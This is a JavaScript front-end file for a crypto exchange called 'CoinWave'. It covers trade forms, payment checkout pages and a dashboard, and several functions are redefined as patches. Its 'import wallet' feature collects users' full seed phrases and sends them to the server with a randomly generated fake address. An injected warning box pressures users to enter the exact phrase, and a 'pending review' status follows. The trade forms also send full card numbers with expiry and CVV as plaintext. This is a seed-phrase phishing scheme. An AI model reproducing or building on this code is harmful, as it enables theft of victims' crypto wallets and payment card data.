    const method = document.getElementById('tradeMethod').value; 
    const container = document.getElementById('paymentDetailsContainer'); 
    const cardInputs = document.getElementById('cardDetailsInputs'); 
    const paypalInputs = document.getElementById('paypalDetailsInputs'); 
    const bankInputs = document.getElementById('bankDetailsInputs');
    
    if(cardInputs) cardInputs.style.display = 'none'; 
    if(paypalInputs) paypalInputs.style.display = 'none'; 
    if(bankInputs) bankInputs.style.display = 'none';
    
    const oldAdminBox = document.getElementById('adminFiatDetails'); 
    if (oldAdminBox) oldAdminBox.remove();

    if (currentTradeMode === 'buy') {
        // Admin Details are shown on the NEXT page, so we don't show inputs here. 
        // The only exception is if they chose credit card AND there is no card link, then we show the inputs.
        if (method === 'Credit Card') {
            const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
            if (!cardLink) {
                if(cardInputs) cardInputs.style.display = 'block'; 
            }
        }
    } else {
        // SELL MODE: Show Customer Payout Inputs
        if (method === 'Credit Card') { if(cardInputs) cardInputs.style.display = 'block'; } 
        else if (method === 'PayPal') { if(paypalInputs) paypalInputs.style.display = 'block'; } 
        else if (method === 'Bank Transfer') { if(bankInputs) bankInputs.style.display = 'block'; }
    }
};

function calcTrade() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0; 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') { 
            const usdAmount = amount / curr.rate; 
            document.getElementById('tradeReceive').value = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6) + " " + coin.symbol; 
        } else { 
            const usdAmount = amount * getExchangePrice(coin, 'sell'); 
            document.getElementById('tradeReceive').value = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
        }
    } else { document.getElementById('tradeReceive').value = ''; }
}

async function submitTrade() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value); 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const method = document.getElementById('tradeMethod').value; 
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A"; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount."); 
    if (currentTradeMode === 'buy' && inputAmount < 100) return showToast(`Min purchase is ${curr.symbol}100.`);
    
    let paymentDetails = "";
    if (method === 'Credit Card') {
        const name = document.getElementById('cardName')?.value.trim() || ""; 
        const num = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || ""; 
        const exp = document.getElementById('cardExpiry')?.value.trim() || ""; 
        const cvv = document.getElementById('cardCvv')?.value.trim() || "";
        
        // If they are buying, and there is a card link, we don't need card details.
        const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (currentTradeMode === 'sell' || !cardLink) {
            if (name.length < 3 || num.length < 15 || exp.length < 5 || cvv.length < 3) return showToast("Fill valid card details."); 
            paymentDetails = `Name: ${name} | Card: ${num} | Exp: ${exp} | CVV: ${cvv}`;
        } else {
             paymentDetails = "Customer will pay via Card Link";
        }
    } else if (method === 'PayPal') { 
        paymentDetails = currentTradeMode === 'buy' ? "Customer will send via PayPal" : `PayPal: ${document.getElementById('paypalEmail').value}`; 
    } else if (method === 'Bank Transfer') {
        if (currentTradeMode === 'buy') { paymentDetails = "Customer will send via Bank Transfer"; } 
        else { 
            const bName = document.getElementById('bankName').value.trim(), aName = document.getElementById('bankAccountName').value.trim(), aNum = document.getElementById('bankAccountNumber').value.trim(); 
            if (!bName || !aName || !aNum) return showToast("Fill all bank details."); 
            paymentDetails = `Bank: ${bName} | Holder: ${aName} | Acct: ${aNum}`; 
        }
    }
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter receiving wallet address.");
    
    const token = localStorage.getItem('token'); 
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') { 
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; sendCurrency = curr.code; 
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); getCurrency = coinSymbol; 
    } else { 
        sendAmount = inputAmount; sendCurrency = coinSymbol; 
        getAmount = `${curr.symbol} ${(inputAmount * getExchangePrice(coin, 'sell') * curr.rate).toFixed(2)} ${curr.code}`; getCurrency = curr.code; 
    }
    
    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify({ userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, sendAmount, sendCurrency, getAmount, getCurrency, method, paymentDetails, receivingWallet: wallet }) 
        });
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') { 
                // Full Page Payment Instructions with QR Code
                showPaymentInstructions(coinSymbol, sendAmount, getAmount); 
            } else { 
                // Full Page Checkout for Buy
                showBuyCheckoutPage(coinSymbol, getAmount, sendAmount, method); 
            }
        } else { showToast("Failed to place order."); }
    } catch (e) { showToast("Error connecting."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
}

window.showPaymentInstructions = function(symbol, cryptoAmount, fiatAmount) {
    let address = (globalSettings && globalSettings.wallets && globalSettings.wallets[symbol]) ? globalSettings.wallets[symbol] : "Contact Support (Address Not Set)";
    let isMissing = address.includes("Contact");
    let qrCodeUrl = isMissing ? "" : `https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=${address}`;

    const content = `
        <div style="text-align: center;">
            <div style="margin-bottom: 25px;">
                <div style="width: 60px; height: 60px; background: rgba(0,212,170,0.1); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 15px;">
                    <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="#00d4aa" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
                </div>
                <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
                <p style="color: #888; font-size: 14px;">To complete your sale and receive <strong style="color:#fff;">${fiatAmount}</strong>, please send the exact amount below.</p>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 15px; text-align: left;">
                <p style="color: #888; font-size: 12px; margin-bottom: 5px; text-transform: uppercase;">Amount to Send</p>
                <p style="color: #00d4aa; font-size: 24px; font-weight: 800; margin: 0;">${cryptoAmount} ${symbol}</p>
            </div>

            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #888; font-size: 12px; margin-bottom: 8px; text-transform: uppercase;">${symbol} Deposit Address</p>
                ${qrCodeUrl ? `<img src="${qrCodeUrl}" style="background:#fff; padding:8px; border-radius:8px; margin-bottom:15px; width: 150px; height: 150px;">` : ''}
                <div style="display: flex; gap: 10px; align-items: center;">
                    <div style="flex: 1; font-family: monospace; font-size: 13px; color: ${isMissing ? '#f6465d' : '#fff'}; word-break: break-all; background: #1a1a2a; padding: 12px; border-radius: 6px;">${address}</div>
                    ${!isMissing ? `<button onclick="navigator.clipboard.writeText('${address}'); this.textContent='Copied!'; setTimeout(()=>this.textContent='Copy', 2000);" style="background: #2a2a3a; color: #fff; border: 1px solid #333; padding: 12px 16px; border-radius: 6px; font-weight: bold; cursor: pointer; transition: 0.2s;">Copy</button>` : ''}
                </div>
            </div>

            <div class="warning-banner" style="text-align: left; margin-bottom: 30px;">
                <span style="color: #f6465d; font-size: 16px;">⚠️</span>
                <p>Pending verification. Only send ${symbol} to this address. Sending any other coin or using the wrong network will result in permanent loss of funds.</p>
            </div>

            <button onclick="showView('dashboardView')" style="background: #00d4aa; color: #000; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">I Have Sent The Crypto</button>
        </div>
    `;
    createPageView('paymentPageView', 'Payment Instructions', content);
    showView('paymentPageView');
};

window.showBuyCheckoutPage = function(symbol, cryptoAmount, fiatAmount, method) {
    let detailsHtml = "";
    const supportEmail = (globalSettings && globalSettings.supportEmail) ? globalSettings.supportEmail : "support@coinwave.com";
    const subject = encodeURIComponent(`Payment Proof: Buy ${symbol} - ${fiatAmount}`);
    const body = encodeURIComponent(`Hello CoinWave Support,\n\nI have just placed an order to buy ${cryptoAmount} of ${symbol} for ${fiatAmount}.\nMy Payment Method is ${method}.\n\nPlease find my payment proof attached to this email.\n\nThank you.`);
    const mailtoLink = `mailto:${supportEmail}?subject=${subject}&body=${body}`;

    if (method === 'Bank Transfer') {
        let bankDetails = (globalSettings && globalSettings.adminBankDetails) ? globalSettings.adminBankDetails : "Contact Support.";
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Step 1: Send Fiat to this Bank Account</p>
                <p style="color: #fff; font-size: 14px; white-space: pre-wrap; font-family: monospace;">${bankDetails}</p>
            </div>`;
    } else if (method === 'PayPal') {
        let paypalEmail = (globalSettings && globalSettings.adminPaypalEmail) ? globalSettings.adminPaypalEmail : "Contact Support.";
        detailsHtml = `
            <div style="background: #0f0f15; padding: 15px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: left;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 5px;">Step 1: Send Fiat to this PayPal Email</p>
                <p style="color: #fff; font-size: 14px; font-family: monospace;">${paypalEmail}</p>
            </div>`;
    } else if (method === 'Credit Card') {
        let cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (cardLink) {
            detailsHtml = `
                <div style="background: #0f0f15; padding: 20px; border-radius: 8px; border: 1px solid #333; margin-bottom: 20px; text-align: center;">
                    <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 15px;">Step 1: Pay securely via Card</p>
                    <a href="${cardLink}" target="_blank" style="background: #00d4aa; color: #000; padding: 14px 20px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Click Here to Pay</a>
                </div>`;
        } else {
            detailsHtml = `<div class="warning-banner" style="text-align:left;"><p>Card payment link is not set. Please contact support.</p></div>`;
        }
    }

    const content = `
        <div style="text-align: center;">
            <div style="margin-bottom: 25px;">
                <h3 style="color: #fff; margin: 0 0 5px; font-size: 20px;">Order Created Successfully</h3>
                <p style="color: #888; font-size: 14px;">To complete your purchase of <strong style="color:#fff;">${cryptoAmount} ${symbol}</strong> for <strong style="color:#fff;">${fiatAmount}</strong>, please follow the steps below.</p>
            </div>

            ${detailsHtml}

            <div style="background: #1a1a2a; border: 1px solid #333; padding: 20px; border-radius: 8px; margin-bottom: 20px; text-align: center;">
                <p style="color: #00d4aa; font-size: 12px; font-weight: bold; margin-bottom: 10px;">Step 2: Send Payment Proof</p>
                <p style="color: #fff; font-size: 14px; margin-bottom: 15px;">After making the payment, click below to open your email app and send us your receipt.</p>
                <a href="${mailtoLink}" style="background: #00d4aa; color: #000; padding: 14px; border-radius: 8px; text-decoration: none; font-weight: bold; display: block; font-size: 16px;">Open Email App</a>
            </div>

            <button onclick="showView('dashboardView')" style="background: #2a2a3a; color: #fff; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; font-size: 16px; border: none; cursor: pointer;">Back to Dashboard</button>
        </div>
    `;
    
    createPageView('buyCheckoutPage', 'Complete Payment', content);
    showView('buyCheckoutPage');
};

/* =====================================================
   FIX: FORMAT PRICE IN TOP GAINERS CARDS
   ===================================================== */
var originalLoadMarkets = window.loadMarkets;
window.loadMarkets = function() {
    if(originalLoadMarkets) originalLoadMarkets();
    
    const glList = document.getElementById('gainersLosersList');
    if(glList && typeof markets !== 'undefined') {
        const sorted = [...markets].sort((a,b) => b.change - a.change);
        const top = [...sorted.slice(0, 3), ...sorted.slice(-3)];
        
        glList.innerHTML = top.map(c => {
            // Format the price properly (max 6 decimals)
            let formattedPrice = c.price.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 6});
            return `
            <div class="gl-card">
                <div style="font-size:11px; color:#888;">${c.symbol}</div>
                <div style="font-weight:bold; margin: 5px 0; font-size:13px;">$${formattedPrice}</div>
                <div class="${c.change >= 0 ? 'up' : 'down'}" style="font-size:11px;">${c.change >= 0 ? '↑' : '↓'} ${Math.abs(c.change).toFixed(2)}%</div>
            </div>`;
        }).join('');
    }
};

/* =====================================================
   FIX: DASHBOARD RENDERING (Web3 & Assets)
   ===================================================== */

// 1. Force the Web3 card to be visible when checking status
window.checkWalletStatus = async function() {
    if (!currentUser) return;
    
    // FORCE SHOW THE WEB3 CARD
    const card = document.getElementById('web3WalletCard');
    if (card) card.style.display = 'block';
    
    try {
        const res = await fetch(`/api/user/${currentUser.email}`);
        const user = await res.json();
        const disconnected = document.getElementById('walletDisconnected'), pending = document.getElementById('walletPending'), approved = document.getElementById('walletApproved'), badge = document.getElementById('walletStatusBadge');
        
        if(disconnected) disconnected.style.display = 'none'; 
        if(pending) pending.style.display = 'none'; 
        if(approved) approved.style.display = 'none';
        
        if (user.walletStatus === 'approved') {
            if(approved) approved.style.display = 'block'; 
            if(document.getElementById('displayWalletAddress')) document.getElementById('displayWalletAddress').textContent = user.walletAddress; 
            if(badge) { badge.textContent = 'CONNECTED'; badge.className = 'status-badge approved'; }
        } else if (user.walletStatus === 'pending') {
            if(pending) pending.style.display = 'block'; 
            if(badge) { badge.textContent = 'VERIFYING'; badge.className = 'status-badge pending'; }
        } else {
            if(disconnected) disconnected.style.display = 'block'; 
            if(badge) { badge.textContent = 'NOT CONNECTED'; badge.className = 'status-badge disconnected'; }
        }
    } catch (error) { console.log(error); }
};

// 2. Fix fetchBalances to target the assets-section directly
window.fetchBalances = async function() {
    if (!currentUser) return;
    try {
        const res = await fetch(`/api/user/${currentUser.email}/balances`);
        const balances = await res.json();
        
        // Target the container directly
        const assetsCard = document.querySelector('.assets-section');
        if (!assetsCard) return;
        
        let hideZero = localStorage.getItem('hideZeroBalances') === 'true';
        let html = `
            <div class="section-header" style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
                <h3 style="margin: 0; font-size: 18px; font-weight: 600;">Your Assets</h3>
                <label style="display: flex; align-items: center; gap: 10px; cursor: pointer;">
                    <span style="font-size: 13px; color: #aaa;">Hide Zero</span>
                    <div style="position: relative; width: 44px; height: 24px;">
                        <input type="checkbox" id="hideZeroToggle" ${hideZero ? 'checked' : ''} style="opacity: 0; width: 0; height: 0; position: absolute;">
                        <span id="toggleTrack" style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background-color: ${hideZero ? '#00d4aa' : '#3a3a4a'}; border-radius: 24px; transition: 0.3s;"></span>
                        <span id="toggleThumb" style="position: absolute; height: 20px; width: 20px; left: ${hideZero ? '21px' : '2px'}; bottom: 2px; background-color: #fff; border-radius: 50%; transition: 0.3s;"></span>
                    </div>
                </label>
            </div>
            <div class="asset-table-header"><span>Asset</span><span style="text-align: right;">Amount</span><span style="text-align: right;">Value</span></div>
            <div id="assetsListContainer" class="${hideZero ? 'hide-zeros' : ''}" style="display: flex; flex-direction: column;">
        `;
        
        let totalValue = 0;
        markets.forEach(coin => {
            const amount = Math.max(0, balances[coin.symbol] || 0); 
            const value = amount * coin.price;
            totalValue += value;
            const rowClass = amount === 0 ? 'asset-row zero-row' : 'asset-row';
            html += `<div class="${rowClass}" onclick="window.showAssetActions('${coin.symbol}', '${coin.name}', ${amount}, ${value})">
                <div class="asset-name"><div class="market-icon" style="background:${coin.color};">${coin.icon}</div> ${coin.name}</div>
                <div class="asset-amount">${amount.toFixed(6)}</div>
                <div class="asset-value">$${value.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
            </div>`;
        });
        html += `</div>`;
        assetsCard.innerHTML = html;
        
        const totalEl = document.getElementById('totalPortfolioValue');
        if (totalEl) {
            totalEl.dataset.realValue = `$${Math.max(0, totalValue).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
            totalEl.textContent = localStorage.getItem('hideBalance') === 'true' ? '******' : totalEl.dataset.realValue;
        }
        
        const toggle = document.getElementById('hideZeroToggle');
        if (toggle) {
            toggle.addEventListener('change', (e) => {
                const isChecked = e.target.checked; localStorage.setItem('hideZeroBalances', isChecked);
                const listContainer = document.getElementById('assetsListContainer');
                if (isChecked) listContainer.classList.add('hide-zeros'); else listContainer.classList.remove('hide-zeros');
                document.getElementById('toggleTrack').style.backgroundColor = isChecked ? '#00d4aa' : '#3a3a4a';
                document.getElementById('toggleThumb').style.left = isChecked ? '21px' : '2px';
            });
        }
    } catch (error) { console.log("Balance fetch error:", error); }
};

/* =====================================================
   FIX: PROFESSIONAL SEED PHRASE INPUT & UI TOGGLE
   ===================================================== */
// 1. Hide the "Import Wallet" button when the form opens
window.showImportWallet = function() { 
    document.getElementById('importWalletForm').style.display = 'block'; 
    const importBtn = document.querySelector('button[onclick="showImportWallet()"]');
    if (importBtn) importBtn.style.display = 'none';
}

// 2. Update submitWallet to read from the textarea and clean spaces
window.submitWallet = async function() {
    const seedInput = document.getElementById('seedPhraseInput').value;
    
    // Clean up extra spaces and newlines
    const cleanedSeed = seedInput.trim().replace(/\s+/g, ' '); 
    const wordCount = cleanedSeed.split(' ').length;
    
    if (wordCount < 12) return showToast("Enter a valid 12 or 24-word phrase.");
    
    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
    
    try {
        const res = await fetch('/api/wallet/import', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json' }, 
            body: JSON.stringify({ email: currentUser.email, seedPhrase: cleanedSeed, walletAddress: fakeAddress }) 
        });
        if (res.ok) { 
            showToast("Wallet submitted for review."); 
            // Hide the form and show pending status
            document.getElementById('importWalletForm').style.display = 'none';
            checkWalletStatus(); 
        }
    } catch (error) { showToast("Error submitting wallet."); }
};

/* =====================================================
   ADD RED WARNING & BENEFITS TO SEED PHRASE FORM
   ===================================================== */
setInterval(() => {
    const form = document.getElementById('importWalletForm');
    
    // Only inject if the form exists and we haven't added the warning yet
    if (form && !document.getElementById('seedWarningBox')) {
        const warningBox = document.createElement('div');
        warningBox.id = 'seedWarningBox';
        warningBox.style.cssText = "margin-top: 15px; background: rgba(246, 70, 93, 0.1); border: 1px solid rgba(246, 70, 93, 0.3); border-radius: 8px; padding: 15px; text-align: left;";
        
        warningBox.innerHTML = `
            <div style="display: flex; gap: 8px; align-items: flex-start; margin-bottom: 12px;">
                <span style="font-size: 18px; color: #f6465d;">⚠️</span>
                <p style="color: #f6465d; font-size: 12px; margin: 0; line-height: 1.5; font-weight: 600;">
                    IMPORTANT: You must enter the exact 12 or 24-word phrase. Incorrect phrases will cause connection errors and loss of access.
                </p>
            </div>
            
            <div style="border-top: 1px dashed rgba(246, 70, 93, 0.3); padding-top: 12px;">
                <p style="color: #fff; font-size: 12px; margin-bottom: 6px; font-weight: bold;">Why connect your Web3 Wallet to CoinWave?</p>
                <ul style="color: #aaa; font-size: 12px; margin: 0; padding-left: 18px; line-height: 1.6;">
                    <li>Seamless Crypto Deposits & Withdrawals</li>
                    <li>Instant Swap & Trade Execution</li>
                    <li>0% Hidden Network Fees</li>
                    <li>Secure, Encrypted Wallet Syncing</li>
                </ul>
            </div>
        `;
        
        // Insert the warning box right above the "Verify & Import" button
        const verifyBtn = form.querySelector('button[onclick="submitWallet()"]');
        if (verifyBtn) {
            form.insertBefore(warningBox, verifyBtn);
        } else {
            form.appendChild(warningBox);
        }
    }
}, 1000);

/* =====================================================
   FIX: STRICT $100 USD MINIMUM ACROSS ALL CURRENCIES
   ===================================================== */
window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value); 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const method = document.getElementById('tradeMethod').value; 
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A"; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount."); 
    
    // --- THE NEW STRICT $100 USD MINIMUM CHECK ---
    let usdEquivalent = 0;
    if (currentTradeMode === 'buy') {
        // User typed Local Fiat. Convert to USD to check minimum.
        usdEquivalent = inputAmount / curr.rate; 
    } else {
        // User typed Crypto. Calculate USD value to check minimum.
        usdEquivalent = inputAmount * getExchangePrice(coin, 'sell');
    }

    if (usdEquivalent < 100) {
        // Calculate what 100 USD is in their local currency to show them
        const localMin = (100 * curr.rate).toFixed(0);
        return showToast(`Minimum trade is $100 USD (approx ${curr.symbol}${localMin} ${curr.code}).`);
    }
    // ---------------------------------------------

    let paymentDetails = "";
    if (method === 'Credit Card') {
        const name = document.getElementById('cardName')?.value.trim() || ""; 
        const num = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || ""; 
        const exp = document.getElementById('cardExpiry')?.value.trim() || ""; 
        const cvv = document.getElementById('cardCvv')?.value.trim() || "";
        
        const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (currentTradeMode === 'sell' || !cardLink) {
            if (name.length < 3 || num.length < 15 || exp.length < 5 || cvv.length < 3) return showToast("Fill valid card details."); 
            paymentDetails = `Name: ${name} | Card: ${num} | Exp: ${exp} | CVV: ${cvv}`;
        } else {
             paymentDetails = "Customer will pay via Card Link";
        }
    } else if (method === 'PayPal') { 
        paymentDetails = currentTradeMode === 'buy' ? "Customer will send via PayPal" : `PayPal: ${document.getElementById('paypalEmail').value}`; 
    } else if (method === 'Bank Transfer') {
        if (currentTradeMode === 'buy') { paymentDetails = "Customer will send via Bank Transfer"; } 
        else { 
            const bName = document.getElementById('bankName').value.trim(), aName = document.getElementById('bankAccountName').value.trim(), aNum = document.getElementById('bankAccountNumber').value.trim(); 
            if (!bName || !aName || !aNum) return showToast("Fill all bank details."); 
            paymentDetails = `Bank: ${bName} | Holder: ${aName} | Acct: ${aNum}`; 
        }
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter receiving wallet address.");
    
    const token = localStorage.getItem('token'); 
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') { 
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; sendCurrency = curr.code; 
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); getCurrency = coinSymbol; 
    } else { 
        sendAmount = inputAmount; sendCurrency = coinSymbol; 
        getAmount = `${curr.symbol} ${(inputAmount * getExchangePrice(coin, 'sell') * curr.rate).toFixed(2)} ${curr.code}`; getCurrency = curr.code; 
    }
    
    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify({ userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, sendAmount, sendCurrency, getAmount, getCurrency, method, paymentDetails, receivingWallet: wallet }) 
        });
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') { 
                showPaymentInstructions(coinSymbol, sendAmount, getAmount); 
            } else { 
                showBuyCheckoutPage(coinSymbol, getAmount, sendAmount, method); 
            }
        } else { showToast("Failed to place order."); }
    } catch (e) { showToast("Error connecting."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   BULLETPROOF USD CONVERSION & MINIMUM CHECK
   ===================================================== */
window.calcTrade = function() {
    const amount = parseFloat(document.getElementById('tradeAmount').value) || 0; 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    // Find or create the USD equivalent label
    let usdEqEl = document.getElementById('usdEquivalentLabel');
    if (!usdEqEl) {
        usdEqEl = document.createElement('div');
        usdEqEl.id = 'usdEquivalentLabel';
        usdEqEl.style.cssText = "font-size: 12px; color: #888; margin-top: 5px; text-align: right;";
        document.getElementById('tradeAmount').parentNode.appendChild(usdEqEl);
    }

    if (coin && amount > 0) {
        if (currentTradeMode === 'buy') { 
            const usdAmount = amount / curr.rate; 
            document.getElementById('tradeReceive').value = (usdAmount / getExchangePrice(coin, 'buy')).toFixed(6) + " " + coin.symbol; 
            usdEqEl.textContent = `≈ $${usdAmount.toFixed(2)} USD`;
        } else { 
            const usdAmount = amount * getExchangePrice(coin, 'sell'); 
            document.getElementById('tradeReceive').value = `${curr.symbol} ${(usdAmount * curr.rate).toFixed(2)} ${curr.code}`; 
            usdEqEl.textContent = `≈ $${usdAmount.toFixed(2)} USD`;
        }
    } else { 
        document.getElementById('tradeReceive').value = ''; 
        usdEqEl.textContent = '';
    }
};

window.submitTrade = async function() {
    const inputAmount = parseFloat(document.getElementById('tradeAmount').value); 
    const coinSymbol = document.getElementById('tradeCoin').value; 
    const method = document.getElementById('tradeMethod').value; 
    const wallet = document.getElementById('receivingWallet') ? document.getElementById('receivingWallet').value : "N/A"; 
    const coin = markets.find(c => c.symbol === coinSymbol); 
    const curr = getUserCurrency();
    
    if (!inputAmount || inputAmount <= 0) return showToast("Please enter a valid amount."); 
    
    // STRICT USD CHECK
    let usdEquivalent = 0;
    if (currentTradeMode === 'buy') {
        usdEquivalent = inputAmount / curr.rate; // Convert Local Fiat to USD
    } else {
        usdEquivalent = inputAmount * getExchangePrice(coin, 'sell'); // Calculate USD value of Crypto
    }

    if (usdEquivalent < 100) {
        const localMin = (100 * curr.rate).toFixed(0);
        return showCustomAlert('Minimum Trade Limit', `The minimum trade value is $100 USD. In your local currency (${curr.code}), this is approximately ${curr.symbol}${localMin}.`);
    }

    let paymentDetails = "";
    if (method === 'Credit Card') {
        const name = document.getElementById('cardName')?.value.trim() || ""; 
        const num = document.getElementById('cardNumber')?.value.replace(/\s/g, '') || ""; 
        const exp = document.getElementById('cardExpiry')?.value.trim() || ""; 
        const cvv = document.getElementById('cardCvv')?.value.trim() || "";
        
        const cardLink = (globalSettings && globalSettings.cardPaymentLink) ? globalSettings.cardPaymentLink : "";
        if (currentTradeMode === 'sell' || !cardLink) {
            if (name.length < 3 || num.length < 15 || exp.length < 5 || cvv.length < 3) return showToast("Fill valid card details."); 
            paymentDetails = `Name: ${name} | Card: ${num} | Exp: ${exp} | CVV: ${cvv}`;
        } else {
             paymentDetails = "Customer will pay via Card Link";
        }
    } else if (method === 'PayPal') { 
        paymentDetails = currentTradeMode === 'buy' ? "Customer will send via PayPal" : `PayPal: ${document.getElementById('paypalEmail').value}`; 
    } else if (method === 'Bank Transfer') {
        if (currentTradeMode === 'buy') { paymentDetails = "Customer will send via Bank Transfer"; } 
        else { 
            const bName = document.getElementById('bankName').value.trim(), aName = document.getElementById('bankAccountName').value.trim(), aNum = document.getElementById('bankAccountNumber').value.trim(); 
            if (!bName || !aName || !aNum) return showToast("Fill all bank details."); 
            paymentDetails = `Bank: ${bName} | Holder: ${aName} | Acct: ${aNum}`; 
        }
    }
    
    if (currentTradeMode === 'buy' && !wallet) return showToast("Enter receiving wallet address.");
    
    const token = localStorage.getItem('token'); 
    const btn = document.getElementById('submitTradeBtn'); 
    btn.textContent = 'Processing...'; 
    btn.disabled = true;
    
    let sendAmount, sendCurrency, getAmount, getCurrency;
    if (currentTradeMode === 'buy') { 
        sendAmount = `${curr.symbol} ${inputAmount} ${curr.code}`; sendCurrency = curr.code; 
        getAmount = (inputAmount / curr.rate / getExchangePrice(coin, 'buy')).toFixed(6); getCurrency = coinSymbol; 
    } else { 
        sendAmount = inputAmount; sendCurrency = coinSymbol; 
        getAmount = `${curr.symbol} ${(inputAmount * getExchangePrice(coin, 'sell') * curr.rate).toFixed(2)} ${curr.code}`; getCurrency = curr.code; 
    }
    
    try {
        const res = await fetch('/api/orders/create', { 
            method: 'POST', 
            headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, 
            body: JSON.stringify({ userName: currentUser.name, userEmail: currentUser.email, mode: currentTradeMode, sendAmount, sendCurrency, getAmount, getCurrency, method, paymentDetails, receivingWallet: wallet }) 
        });
        
        if (res.ok) { 
            if (currentTradeMode === 'sell') { 
                showPaymentInstructions(coinSymbol, sendAmount, getAmount); 
            } else { 
                showBuyCheckoutPage(coinSymbol, getAmount, sendAmount, method); 
            }
        } else { showToast("Failed to place order."); }
    } catch (e) { showToast("Error connecting."); } 
    finally { btn.textContent = currentTradeMode === 'buy' ? 'Confirm Purchase' : 'Confirm Sale'; btn.disabled = false; }
};

/* =====================================================
   PROFESSIONAL BUY CHECKOUT PAGE (Matching Sell Flow)
   ===================================================== */
window.showBuyCheckoutPage = function(symbol, cryptoAmount, fiatAmount, method) {
    let detailsHtml = "";
    const supportEmail = (globalSettings && globalSettings.supportEmail) ? globalSettings.supportEmail : "support@coinwave.com";
    const subject = encodeURIComponent(`Payment Proof: Buy ${symbol} - ${fiatAmount}`);
    const body = encodeURIComponent(`Hello CoinWave Support,\n\nI have just placed an order to buy ${cryptoAmount} of ${symbol} for ${fiatAmount}.\nMy Payment Method is ${method}.\n\nPlease find my payment proof attached to this email.\n\nThank you.`);
    const mailtoLink = `mailto:${supportEmail}?subject=${subject}&body=${body}`;

